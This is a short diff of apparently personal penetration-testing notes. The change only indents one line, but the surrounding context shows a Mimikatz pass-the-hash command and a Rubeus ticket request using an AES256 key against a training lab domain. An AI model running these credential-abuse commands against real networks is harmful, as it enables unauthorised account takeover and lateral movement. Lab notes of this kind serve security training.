@@ -150,7 +150,7 @@ Create a cmd.exe to request access to any service for the target user
 ```cmd
 sekurlsa::pth /domain:<domain> /user:<user> /ntlm:hash
 ```
-Mimikatz requires admin privileges and rubeus doesn't to PtK
+	Mimikatz requires admin privileges and rubeus doesn't to PtK
 ```cmd
 Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
